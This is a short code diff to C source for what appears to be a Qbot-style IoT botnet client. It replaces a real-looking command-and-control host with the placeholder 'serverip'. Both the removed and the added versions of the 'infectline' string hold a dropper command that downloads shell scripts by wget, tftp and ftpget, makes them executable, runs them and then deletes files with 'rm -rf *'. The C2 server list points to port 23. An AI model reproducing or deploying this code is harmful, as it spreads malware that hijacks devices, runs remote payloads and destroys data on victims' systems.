@@ -32,13 +32,13 @@
 #include <sys/ioctl.h>
 #include <net/if.h>
 
-char *infectline = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://qbot-bluematrix45754.codeanyapp.com/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp qbot-bluematrix45754.codeanyapp.com -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g qbot-bluematrix45754.codeanyapp.com; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 qbot-bluematrix45754.codeanyapp.com ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit\r\n";
+char *infectline = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget serverip/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp serverip -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g serverip; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 serverip ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit\r\n";
 
 // WGET LINE GOES HERE ^
 
 unsigned char *commServer[] =
 {
-        "qbot-bluematrix45754.codeanyapp.com:23"
+        "serverip:23"
 };
 
 int initConnection();
